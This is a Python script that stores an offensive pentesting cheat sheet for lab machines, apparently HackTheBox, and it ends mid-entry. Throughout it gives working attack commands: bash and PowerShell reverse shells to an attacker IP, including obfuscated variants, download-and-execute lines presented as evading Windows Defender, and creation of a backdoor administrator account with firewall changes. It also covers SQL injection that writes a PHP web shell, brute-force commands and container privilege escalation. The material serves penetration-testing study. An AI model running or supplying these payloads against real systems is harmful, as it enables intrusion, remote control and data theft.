import os
from time import sleep


class Cheat:
    def __init__(self, name):
        self.name = name
        self.category = None
        self.subCategory = None
        self.output = None
        self.addToList()

    def addToList(self):
        global cheatList
        cheatList.append(self)


class Color:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    GRAY = "\033[90m"
    FAIL = "\033[91m"
    OK_GREEN = "\033[92m"
    WARNING = "\033[93m"
    OK_BLUE = "\033[94m"
    HEADER = "\033[95m"
    OK_CYAN = "\033[96m"


ip = os.popen("""/bin/ip add | grep "tun0" | grep "inet" | tr "/" " " | awk '{print$2}'""").read().strip()

if ip in "":
	ip = "x.x.x.x"
cheatList = []

######################################
######################################

PSCredential = Cheat("PSCredential (runas)")
PSCredential.category = "Windows"
PSCredential.subCategory = "Powershell"
PSCredential.output = """[*] PSCredential - Create a Credential Object for PowerShell (runas):

# Create Secure password and execute a command with other user
$user = 'hostname\\user'
$pw = 'password'
$secure_pw = ConvertTo-SecureString $pw -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $user, $secure_pw
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }

# Get the password from a Secure password
(Import-CliXml -Path user.txt).GetNetworkCredential().password
"""

######################################
######################################

icmp_reverse_shell_windows = Cheat(
    "ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)"
)
icmp_reverse_shell_windows.category = "Windows"
icmp_reverse_shell_windows.subCategory = "Reverse Shell"
icmp_reverse_shell_windows.output = """[*] Reverse Shell when TCP and UDP connection are blocked by Firewall rules.

# 1 - Download Nishang
# 2 - Remove all blank lines and commented lines for no bugs
# 3 - Convert reverseShell File => bytes => base64
# 4 - Convert "+" and "=" symboles into "%2B" and "%3D" respectively (prevents UrlEncode errors)
# 5 - Split the long String (in base64) to small lines (80 chars) for not excede url capacity
# 6 - Send file splitted in multiples part to the target
# 7 - Decode the new file in target machine AND execute

# - 2 on kali
cat IP_icmp.ps1 | sed '/^\s*$/d' > new_IP_icmp.ps1

# - 3 on kali
pwsh
$fileContent = Get-Content -Raw ./new_IP_icmp.ps1
$bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent)
$encoded = [Convert]::ToBase64String($bytes)
$encoded | Out-File new_IP_icmp.ps1.b64
exit

# - 4 on kali
cat new_IP_icmp.ps1.b64 | sed 's/+/%2B/g' | sed 's/=/%3D/g'

# - 5 on kali
fold -w 80 new_IP_icmp.ps1.b64 > final_IP_icmp.ps1.b64

# - 6 on kali
for line in $(cat icmp.ps1.b64); do cmd="echo ${line} >> C:\Temp\shell.ps1"; curl -s -X GET -G "http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx" --data-urlencode "xcmd=$cmd"; done

# - 7 on target machine
$file = Get-Content -Raw C:\Temp\shell.ps1
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file))
$decoded > C:\Temp\pwned.ps1
powershell C:\Temp\pwned.ps1
"""

######################################
######################################

check_priv_file = Cheat("cacls.exe - Check Privilege of a file")
check_priv_file.category = "Windows"
check_priv_file.subCategory = "Utility"
check_priv_file.output = """[*] Check Privilege of a file like ls -lArth in Linux.
cacls C:\PATH\File.ext
"""

######################################
######################################

alternative_data_streams = Cheat(
    "Alternate Data Streams (MetaData), hide file in a file"
)
alternative_data_streams.category = "Windows"
alternative_data_streams.subCategory = "Utility"
alternative_data_streams.output = """[*] Check for hide data in a file (like stenography for images)

# List all available data streams
Get-Item -Path C:\Temp\\backup.zip -stream *

# (Stdout)	    FileName: C:\Temp\backup.zip
# (Stdout)	
# (Stdout)	 Stream                   Length    
# (Stdout)	 ------                   ------
# (Stdout)	 :$DATA                   103297
# (Stdout)	 pass                         34

# Extract the data
type C:\Temp\\backup.zip:pass
"""

######################################
######################################

firewall_rules_change_to_accept_IP_Attacker = Cheat(
    "Create new local user with administrator privilege - Firewall Rules - PostExploit"
)
firewall_rules_change_to_accept_IP_Attacker.category = "Windows"
firewall_rules_change_to_accept_IP_Attacker.subCategory = "PostExploit"
firewall_rules_change_to_accept_IP_Attacker.output = """[*] Create new local user with administrator privilege...

# Add a new user and assign him as Administrators group for highest local privilege
net user javali J4val1*! /add
net localgroup Administrators javali /add


[*] Manage Firewall and other things

# Add an IP to target firewall rules to accept traffic from UDP and TCP (Need administrator privileges) (PS)
New-NetFirewallRule -DisplayName pwned -RemoteAddress 10.10.14.53 -Direction inbound -Action Allow

# Add permission to execute command from out of the local system (cmd)
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

# Open Ports (cmd)
netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=in localport=445 action=allow
netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=out localport=445 action=allow

# Don't know what he do loool. But is importante... need to check...
net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL
"""

######################################
######################################

evil_winrm = Cheat("Evil-winrm - (Web Service Management Protocol WS-Management) ")
evil_winrm.category = "Windows"
evil_winrm.subCategory = "WinRM"
evil_winrm.output = """[*] Evil-winrm - Automated tool to bind stable shell when WS-Management Protocol is active an open and we have correct credentials

gem install evil-winrm
evil-winrm -i 10.10.10.57 -u 'administrator' -p '1234test'
"""

######################################
######################################

snmpwalk = Cheat("snmpwalk - onesixtyone - 161 UDP - Comunity string - SNMP")
snmpwalk.category = "Tools"
snmpwalk.subCategory = "SNMP"
snmpwalk.output = """[*] Even if port 161 is filtered or pointed to closed, this tool can find out if port 161 UDP is operational.

onesixtyone 10.10.10.116



[*] snmpwalk - retrieve a subtree of management values using SNMP GETNEXT requests.

snmpwalk -c public -v2c 10.10.10.116 > contents/snmpwalk.out
"""

######################################
######################################

ike_scan = Cheat("ike-scan - 500 UDP - IPsec VPN / ipsec - strongSwan (VPN)")
ike_scan.category = "Tools"
ike_scan.subCategory = "VPN"
ike_scan.output = """[*] ike-scan - Discover and fingerprint IKE hosts (IPsec VPN servers)

# ver vídeo - HackTheBox | Conceal [OSCP Style] (TWITCH LIVE)
# https://www.youtube.com/watch?v=RtztYLMZMe8&list=PLWys0ZbXYUy7GYspoUPPsGzCu1bdgUdzf&t=3187s

ike-scan 10.10.10.116 -M

# Connect to de VPN
sudo restart ipsec
"""

######################################
######################################

file_transfere_windows_iwr = Cheat(
    "File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe"
)
file_transfere_windows_iwr.category = "Windows"
file_transfere_windows_iwr.subCategory = "File Transfere"
file_transfere_windows_iwr.output = """[*] Simple File Transfere for Windows with PowerShell

# simple download
powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.53:80/nc.exe' -OutFile 'C:\Temp\\nc.exe'"

# Donwload and execute directly in RAM (Escape Windows Defender)
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')
start /b C:\Windows\SysNative\WindowsPowerShell\\v1.0\powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')"

start /b C:\Windows\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')"

# Certutil.exe
certutil -urlcache -f http://10.10.14.53:80/nc.exe C:\Temp\\nc.exe

"""

######################################
######################################

file_transfere_windows_smbserver = Cheat(
    "File Transfere Windows - SmbServer.py (Impacket)"
)
file_transfere_windows_smbserver.category = "Windows"
file_transfere_windows_smbserver.subCategory = "File Transfere"
file_transfere_windows_smbserver.output = """[*] Create Shared Folder by the Internet with SmbServer.py (Impacket)

# On kali
smbserver.py smbFolder $(pwd) -user javali -password javali -smb2support

# On target machine
# Connect to SmbServer with credencial for more compatibility and less bugs
net use \\\\10.10.14.53\smbFolder /u:javali javali
copy \\\\10.10.14.53\smbFolder\\nc64.exe C:\Windows\Temp\\nc64.exe
# Execute directely without transfere
\\\\10.10.14.53\smbFolder\\nc64.exe -e cmd 10.10.14.53 443
"""

######################################
######################################

oracle_odat = Cheat("odat - Oracle DatabaseAttacking Tools - 1521 TCP oracle-tns")
oracle_odat.category = "Tools"
oracle_odat.subCategory = "Databases"

oracle_odat.output = """[*] Powerfull tool to exploit Oracle Database

# Bruteforce SID for next attacks...
odat sidguesser -s 10.10.10.82

# BruteForce default user and password in format: user/password for odat compatibility
locate oracle | grep pass
cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt | tr " " "/" > passwords.txt
sudo odat passwordguesser -s 10.10.10.82 -d <ValidSID> --accounts-file /path/to/passwords.txt

# Upload a Shell
odat utlfile -s 10.10.10.82 -d <ValidSID> -U "ValidUser" -P "ValidPass" --putFile /Temp shell.exe /path/to/shell.exe --sysdba

# RCE
odat externaltable -s 10.10.10.82 -d <ValidSID> -U "ValidUser" -P "ValidPass" --exec /Temp shell.exe --sysdba
"""

######################################
######################################

crackMapExec = Cheat("crackmapexec - Impacket - 445 TCP")
crackMapExec.category = "Windows"
crackMapExec.subCategory = "Impacket"
crackMapExec.output = """[*] crackmapexec is a swiss army knife for pentesting network! 
[*] available protocols: ssh, winrm, mssql, ldap, smb

# SMB enumeration
crackmapexec smb 10.10.10.193
crackmapexec smb 10.10.10.193 -u users.txt -p passwords.txt
crackmapexec smb 10.10.10.193 -u users.txt -p passwords.txt --continue-on-success | grep -vi "FAILURE"
crackmapexec smb 10.10.10.193 --shares 

# Check if is valide user and password OR NT hash
crackmapexec smb 10.10.10.192 -u "Administrator" -p "AdminPass"
crackmapexec smb 10.10.10.192 -u "Administrator" -H "7f1e4ff8c6a8e6b6fcae2d9c0572cd62"


# WinRM enumeration - Check if we can get Interactive shell with a valid user
crackmapexec winrm 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
"""

######################################
######################################

cewl = Cheat(
    "cewl - Create a list of password (or something) from all words of a html page"
)
cewl.category = "Tools"
cewl.subCategory = "Password"
cewl.output = """[*] Simple tool to take all word of a html page and create a file

cewl -w passwords.txt http://10.10.10.100/
cewl -w passwords.txt http://10.10.10.100/ --with-numbers
"""

######################################
######################################

smbpasswd = Cheat("smbpasswd - SMB STATUS_PASSWORD_MUST_CHANGE - Impacket - 445 TCP")
smbpasswd.category = "Windows"
smbpasswd.subCategory = "Impacket"
smbpasswd.output = """[*] smbpasswd - change a user's SMB password

smbpasswd -r 10.10.10.193 -U "bhult"

"""

######################################
######################################

seLoadDriverPrivilege = Cheat("SeLoadDriverPrivilege /priv")
seLoadDriverPrivilege.category = "Windows"
seLoadDriverPrivilege.subCategory = "PrivEsc via group"

seLoadDriverPrivilege.output = """[*] SeLoadDriverPrivilege - If Enabled... GG! 
[*] https://github.com/limitedeternity/ExploitCapcom
"""

######################################
######################################

reverseSheel = Cheat("Basic and advanced Reverses Shells - Linux")
reverseSheel.category = "Linux"
reverseSheel.subCategory = "Reverse Shell"
reverseSheel.output = """[*] TCP Reverse Shell - Linux

bash -c 'exec sh -i &>/dev/tcp/10.10.14.53/443 <&1'
# Octal ofuscation
echo "bash -c 'exec sh -i &>/dev/tcp/10.10.14.53/443 <&1'" | od -b -An | sed 's/ /\\/g' | tr -d "\n" | xclip -sel clip
printf "\142\141\163\150\040\055\143\040\047\145\170\145\143\040\163\150\040\055\151\040\046\076\057\144\145\166\057\165\144\160\057\061\060\056\061\060\056\061\064\056\065\063\057\064\064\063\040\074\046\061\047\012" | sh

# Base64 ofuscation
echo "bash -c 'exec bash -i &>/dev/tcp/10.10.14.53/443 <&1'" | base64 -w0 into_clip
echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQzIDwmMScK | base64 -d | bash

[*] UDP Reverse Shell - Linux

bash -c 'exec sh -i &>/dev/udp/10.10.14.53/443 <&1'
"""


######################################
######################################

reverseShell_Win = Cheat("Basic and advanced Reverse Shells - Windows")
reverseShell_Win.category = "Windows"
reverseShell_Win.subCategory = "Reverse Shell"
reverseShell_Win.output = """[*] Simple one liner to get a reverse Shell TCP Windows

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.53',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
"""

######################################
######################################

python_urlEncode = Cheat("UrlEncode - urllib - BeautifulSoup - Python3")
python_urlEncode.category = "Python"
python_urlEncode.subCategory = "Encoding"
python_urlEncode.output = """[*] Convert strings into urlencoded strings for requests

# Don't forgot the " simbole can't be inputed when write cmd.
# Example: echo "test" => ERROR 404
# Example: echo 'test' => test
import urllib

	url = "http://10.10.10.27/admin.php?html="
	cmd = input("[ Fake Shell ] ")
	phpCode = urllib.parse.quote_plus(f'<?php system("{cmd}");?>')
	finalUrl = url + phpCode


[*] Get strings from html easily

from bs4 import BeautifulSoup
	res = requests.post(url, headers=headers, data=data).text
	res = BeautifulSoup(res, 'html.parser')
	res = res.find_all('tbody')[0]
	res = res.get_text().strip()
	print(res)
"""

######################################
######################################

lxd_id = Cheat("Group LXD / Docker")
lxd_id.category = "Linux"
lxd_id.subCategory = "PrivEsc via group"
lxd_id.output = """[*] PrivEsc with LXD / Docker Group...

# Git clone lxd alpine builder from saghul...
git clone https://github.com/saghul/lxd-alpine-builder.git

# Build the Docker (maybe many times...) (Need to be root)
sudo ./build-alpine 
sudo ./build-alpine -a i686

# Transfere new docker to target!
sudo python3 -m http.server 80
wget http://<kali ip>:80/<alpine-name.tar.gz>

# Load the Docker and mount / for see all file with docker root privilege
# lxd init may not be available, but normally is up so... forgot it
lxd init

lxc image import ./<alpine-name.tar.gz> --alias javali
lxc init javali javali-container -c security.privileged=true
lxc config device add javali-container mydevice disk source=/ path=/mnt/root recursive=true
lxc start javali-container
lxc exec javali-container /bin/sh
"""

######################################
######################################

smbclient = Cheat("smbclient - Basics - TCP 445 - cifs-utils (smb mount)")
smbclient.category = "Windows"
smbclient.subCategory = "File Transfere"
smbclient.output = """[*] smbclient - ftp-like client to access SMB/CIFS resources on servers

smbclient -L \\\\\\\\10.10.10.10\\\\                       # Enumera as pastas não ocultas em modo anonymous
smbclient -p 1234 \\\\\\\\10.10.10.10\\\\                  # Especifica uma porta diferente da normal (445)
smbclient \\\\\\\\10.10.10.10\\\\directory                 # Tenta entrar para a pasta "directory" do share SMB
smbclient -k \\\\\\\\10.10.10.10\\\\                       # Kerberos mode
smbclient -U username -N \\\\\\\\10.10.10.10\\\\           # Tenta entrar com username sem password
smbclient -L 10.10.10.10 -U "username%password"
smbclient -W workgroup \\\\\\\\10.10.10.10\\\\

# If they re to much directories and files, just mount them into the kali machine!
apt install cifs-utils
mkdir /mnt/smb
mount -t cifs //10.10.10.10/folder /mnt/smb -o username=username,password=password,domain=WORKGROUP,rw
mount -t cifs //10.10.10.59/ACCT /mnt/smb -o username=Finance,password=Acc0unting,domain=WORKGROUP,rw
"""

######################################
######################################

manualTcpScanInBash = Cheat("Manual TCP Scan in Bash")
manualTcpScanInBash.category = "Tools"
manualTcpScanInBash.subCategory = "Bash"
manualTcpScanInBash.output = """[*] Manually scan ports in bash when no nmap or similar

for port in $(seq 1 65355); do
	timeout 1 bash -c "echo > /dev/tcp/10.10.10.123/$port" && echo "[*] Open Port => $port" &
done; wait
"""

######################################
######################################

hydraBasics = Cheat("hydra - Login BruteForce")
hydraBasics.category = "Tools"
hydraBasics.subCategory = "BruteForce"
hydraBasics.output = """[*] A very fast network logon cracker which supports many different services

# PRINCIPAL OPTIONS:
# 	-s PORT
# 	-l LOGIN_NAME -L LIST_LOGIN_NAMES
# 	-p PASSWORD -P LIST_PASSWORDS
# 	-C FILE (colon separated "login:pass" format, instead of -L/-P options)
# 	-o FILE (write found login/password pairs to FILE instead of stdout)
# 	-t TASKS (run TASKS number of connects in parallel (default: 16))
# 	-m OPTIONS (module specific options. See hydra -U <module> what  options  are  available.)
# 	-v / -V (verbose mode / show login+pass combination for each attempt)
# 	-f (exit after get first login:password)

export user=Admin
export pass=PaSsW0rD!
export ip=10.10.10.10

hydra -l $user -P ./passwords.txt ftp://$ip -vV -f           # FTP brute force
hydra -l $user -P ./passwords.txt $ip -t 4 ssh -vV -f        # SSH brute force
hydra -P ./passwords.txt -v $ip snmp -vV -f                  # SNMP brute force
hydra -l $user -P ./passwords.txt -f $ip pop3 -vV -f         # POP3 Brute Force
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -vV -f        # SMTP Brute Force
hydra -t 1 -l $user -P ./passwords.txt $ip smb -vV -f        # SMB Brute Forcing
hydra -L users.txt -P passwords.txt $ip smb -vV -f           # SMB Brute Forcing
hydra -t 1 -l $user -P ./passwords.txt rdp://$ip -vV -f      # Hydra attack Windows Remote Desktop
hydra -L users.txt -P passwords.txt $ip ldap2 -vV -f	     # LDAP Brute Forcing
hydra -L ./users.txt -P ./passwords.txt $ip http-get /admin  # attack http get 401 login with a dictionary

# Post Web Form
hydra -l $user -P ./passwordlist.txt $ip http-post-form "/:username=^USER^&password=^PASS^:F=incorrect"
hydra -l $user -P ./passwordlist.txt $ip -V http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

# Get form popup login
hydra -l $user -P ./passwordlist.txt $ip http-get /dir/
"""

######################################
######################################

wgetRecursive = Cheat("wget Recursive")
wgetRecursive.category = "Tools"
wgetRecursive.subCategory = "File Transfere"
wgetRecursive.output = """[*] Download recursively all file from simple server via url

# -np (no-parent) -R "string" (remove files with string name... wilcards works)
wget -r http://10.10.10.75/nibbleblog/content/ -np -R "index.html*" 
"""

######################################
######################################

wpscan = Cheat("wpscan - wordpress")
wpscan.category = "Tools"
wpscan.subCategory = "Web"
wpscan.output = """[*] WPScan - WordPress Security Scanner

wpscan --url www.website.com              # Non-intrusive scan
	-t 50                                 # Force 50 threads
	--cookie-string COOKIE                # Cookie string to use in requests, format: cookie1=value1[; cookie2=value2]
	--wp-content-dir /DIR                 # Specific correct /path when is not the default
	--wp-plugins-dir /DIR                 # Specific correct /path when is not the default
	--enumerate [OPTIONS]                 # Valid options: vp (Vulnerable plugins),
										  #                ap (All plugins),
										  #                p (Plugins),
										  #                vt (Vulnerable themes),
										  #                at (All themes),
										  #                t (Themes),
										  #                tt (Timthumbs),
										  #                cb (Config backups),
										  #                u (User IDs)
										  # Format: [choice],[choice],[choice],...
	-P, --passwords /path/wordlist.txt    # List of password to brute force. If no --usernames, user enumeration will be run
	-U, --usernames /path/wordlist.txt    # List of usernames to brute force. Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
	--update                              # Update database

# Examples:
wpscan --url www.website.com
wpscan --url www.website.com --passwords /path/wordlist.txt -t 50
wpscan --url www.website.com --passwords /path/wordlist.txt --usernames admin
wpscan --url www.website.com --passwords /path/wordlist.txt --usernames admin --wp-content-dir custom-content
wpscan --url www.website.com --passwords /path/wordlist.txt --usernames admin --wp-plugins-dir wp-content/custom-plugins
"""

######################################
######################################

mimeChanger = Cheat("Change MIME Type of file")
mimeChanger.category = "Tools"
mimeChanger.subCategory = "Utility"
mimeChanger.output = """[*] Change MIME Type of file...

# https://en.wikipedia.org/wiki/List_of_file_signatures
# This methode will overwrite first bytes...

xxd -r -p -o 0 <(echo FF D8 FF DB) shell.php.jpg
"""

######################################
######################################

crontabs = Cheat("Crontabs - Basic enumeration Linux")
crontabs.category = "Linux"
crontabs.subCategory = "Enumeration"
crontabs.output = """[*] Crontabs - Basic enumeration Linux

/dev/shm  # comparável ao c:\windows\temp
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
"""

######################################
######################################

cron_checker = Cheat("croncheck.sh - Check Diferentes Processes running")
cron_checker.category = "Linux"
cron_checker.subCategory = "Enumeration"
cron_checker.output = """[*] CronCheck.sh - Simple Bash Script to check diferentes processes running on Linux

#!/bin/bash

old=$(ps -eo command)

echo -e "Start at: $(date +%H:%M:%S)"
while true; do
		echo -ne "Now: $(date +%H:%M:%S)\\r"
		new=$(ps -eo command)
		diff <(echo "$old") <(echo "$new") | grep "[\<\>]" | grep -vE "croncheck.sh|command"
		old=$new
done
"""

######################################
######################################

find_and_grep = Cheat(
    "Find - Grep for Basic enumeration Linux (Clear Usernames or passes, SUID)"
)
find_and_grep.category = "Linux"
find_and_grep.subCategory = "Utility"
find_and_grep.output = """[*] Find - Grep for Basic enumeration Linux

# Usernames or Passwords in clear text?! (examples)

grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find / -name "*php" -type f -print0 2>/dev/null | xargs -0 grep -i -n -E "pass|user" | grep -vE ":.*//|:.*\*"

# Permissions

find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

find / -writable -type d 2>/dev/null      # world-writeable folders
find / -perm -222 -type d 2>/dev/null     # world-writeable folders
find / -perm -o w -type d 2>/dev/null     # world-writeable folders
find / -perm -o x -type d 2>/dev/null     # world-executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders

find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files

ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null | grep -vE "^l|^d"
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null | grep -vE "^l|^d"

find /etc/ -readable -type f 2>/dev/null               # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
"""

######################################
######################################

network = Cheat("network - Basic enumeration Linux")
network.category = "Linux"
network.subCategory = "Enumeration"
network.output = """[*] Basic Network enumeration on Linux

cat /proc/net/tcp
for b in $(cat /proc/net/tcp | grep -v "rem_add" | tr ':' ' ' | awk '{print $3}' | sort -u); do python3 -c "print("0x$b")"; done
cat /proc/net/fib_trie
cat /etc/knockd.conf

/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network

cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname

lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w

arp -e
route
/sbin/route -nee

tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 # tcpdump tcp dst [ip] [porta] e tcp dst [ip] [porta]
"""

######################################
######################################

capabilities = Cheat(
    "Capabilities - setcap / getcap / setuid - Basic enumeration Linux"
)
capabilities.category = "Linux"
capabilities.subCategory = "Enumeration"
capabilities.output = """[*] Capabilities - setcap / getcap / setuid

getcap -r / 2>/dev/null               # python with that can easily convert user to root.
									  # import os; os.setuid(0), os.system("/bin/bash")
setcap cap_setuid+ep /path/to/binary  # set uid for scale faster praticaly invisible!
"""


######################################
######################################

findSubDomain_dns = Cheat(
    "nslookup / dig / dnsenum / virtual hosts - Get SubDomain - DNS"
)
findSubDomain_dns.category = "Tools"
findSubDomain_dns.subCategory = "DNS"
findSubDomain_dns.output = """[*] Some tools to find sub domains...

nslookup
	> server 10.10.10.13
	> 10.10.10.13

dig @10.10.10.123 friendzone.red axfr
dnsenum --server 10.10.10.224 --threads 50 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
host -t axfr friendzone.red 10.10.10.123

wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.forwardslash.htb" http://forwardslash.htb/

"""

######################################
######################################

mysqlBasicAndSqlInjection = Cheat("MySQL / SqlInjection")
mysqlBasicAndSqlInjection.category = "Tools"
mysqlBasicAndSqlInjection.subCategory = "Databases"
mysqlBasicAndSqlInjection.output = """[*] Command                                                      # Description

[*] General

mysql -u root -h docker.hackthebox.eu -P 3306 -p                 # login to mysql database

SHOW DATABASES                                                   # List available databases
USE users                                                        # Switch to database

[*] Tables

CREATE TABLE logins (id INT, ...)                                # Add a new table
SHOW TABLES                                                      # List available tables in current database
DESCRIBE logins                                                  # Show table properties and columns
INSERT INTO table_name VALUES (value_1,..)                       # Add values to table
INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)  # Add values to specific columns in a table
UPDATE table_name SET column1=newvalue1, ... WHERE <condition>   # Update table values

[*] Columns

SELECT * FROM table_name                                 # Show all columns in a table
SELECT column1, column2 FROM table_name                  # Show specific columns in a table
DROP TABLE logins                                        # Delete a table
ALTER TABLE logins ADD newColumn INT                     # Add new column
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn  # Rename column
ALTER TABLE logins MODIFY oldColumn DATE                 # Change column datatype
ALTER TABLE logins DROP oldColumn                        # Delete column

[*] Output

SELECT * FROM logins ORDER BY column_1              # Sort by column
SELECT * FROM logins ORDER BY column_1 DESC         # Sort by column in descending order
SELECT * FROM logins ORDER BY column_1 DESC, id ASC # Sort by two-columns
SELECT * FROM logins LIMIT 2                        # Only show first two results
SELECT * FROM logins LIMIT 1, 2                     # Only show first two results starting from index 2
SELECT * FROM table_name WHERE <condition>          # List results that meet a condition
SELECT * FROM logins WHERE username LIKE 'admin%'   # List results where the name is similar to a given string

[*] MySQL Operator Precedence

# Division (`/`), Multiplication (`*`), and Modulus (`%`)
# Addition (`+`) and Subtraction (`-`)
# Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
# NOT (`!`)
# AND (`&&`)
# OR (`||`)

[*] SQL Injection
[*] Payload                                        # Description

# Auth Bypass

admin' or '1'='1                                   # Basic Auth Bypass
admin')-- -                                        # Basic Auth Bypass With comments

[*] Usefull Functions

group_concat(<value>)                              # Concat every values in a long string separated by a comma

[*] Union Injection

' order by 1-- -                                   # Detect number of columns using `order by`
cn' UNION select 1,2,3-- -                         # Detect number of columns using Union injection
cn' UNION select 1,@@version,3,4-- -               # Basic Union injection
UNION select username, 2, 3, 4 from passwords-- -  # Union injection for 4 columns

[*] DB Enumeration

SELECT @@version                                   # Fingerprint MySQL with query output
SELECT SLEEP(5)                                    # Fingerprint MySQL with no output
cn' UNION select 1,database(),2,3-- -              # Current database name

# List all databases
 cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
# List all tables in a specific database
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
# List all columns in a specific table
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -    
# Dump data from a table in another database               
cn' UNION select 1, username, password, 4 from dev.credentials-- -

[*] Privileges

# Find current user
cn' UNION SELECT 1, user(), 3, 4-- -    
# Find if user has admin privileges               
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
# Find if all user privileges
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -
# Find which directories can be accessed through MySQL  
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

[*] File Injection

# Read local file
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
# Write a string to a local file
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
# Write a web shell into the base web directory
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
"""

######################################
######################################

fileTransfereLinux = Cheat("File Transfere Linux - nc / ftp / lftp / scp")
fileTransfereLinux.category = "Linux"
fileTransfereLinux.subCategory = "File Transfere"
fileTransfereLinux.output = """[*] File Transfere Techniques With nc - Linux

nc -nlvp 4646 > file.f     # receiver
nc <Ip> 4646 < file.f      # sender

[*] File Transfere Techniques With FTP server

# curlftpfs - mount a ftp host as a local directory
# The program curlftpfs is a tool to mount remote ftp hosts as local directories. 
# It connects to the host FTP server and maps its directory structure to the path directory.

curlftpfs anonymous:senhalol@10.10.10.78 $(pwd) 

[*] Simple Ftp Transfere

# IMPORTANT NOTE: when download, use binary mode
ftp > binary
ftp > prompt off
ftp > mget *

[*] Login oneLiner with crdentials

lftp -u anonymous,'' 10.10.10.184

[*] Copy files via secure copy (scp)

# Upload file
scp /local/directory/fileName username@x.x.x.x:/remote/directory/fileName 

# Download file
